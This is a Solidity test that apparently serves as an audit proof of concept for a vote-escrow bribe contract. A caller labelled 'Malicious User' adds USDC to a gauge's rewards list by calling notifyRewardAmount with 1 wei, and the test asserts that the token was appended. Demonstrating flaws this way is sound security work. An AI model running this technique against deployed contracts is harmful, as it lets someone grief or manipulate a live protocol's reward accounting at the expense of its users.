// SPDX-License-Identifier: GPL-3
pragma solidity ^0.8.15;

import "./BaseTest.sol";

contract VotingTest is BaseTest {
    function setUp() public {
        setupContracts(block.timestamp);
    }

    function testRewardTokenAddition() public{

        //lets whitelist usdc for the sake of example.    
        hevm.prank(address(timelockExecutor));
        IVoter(voter).whitelist(usdc);

        //current reward token in the list.
        address bribeAddress = voter.bribes(address(sushiGauge));
        uint256 rewardsLength = IBribe(bribeAddress).rewardsListLength();
        console2.log("rewards_list : ",IBribe(bribeAddress).rewards(rewardsLength-1));

        //Malicious User calling the notifyRewardAmount to add USDC as rewards token into the list 
        //with the usdc address and just 1 wei of amount

        deal(usdc, address(this), 1);
        IERC20(usdc).approve(bribeAddress, 1);

        IBribe(bribeAddress).notifyRewardAmount(usdc, 1);
        rewardsLength = IBribe(bribeAddress).rewardsListLength();

        //usdc has been added to the rewards list.
        console2.log("rewards_list : ",IBribe(bribeAddress).rewards(rewardsLength-1));
        assertEq(IBribe(bribeAddress).rewards(rewardsLength-1),usdc); 
        
    }

}
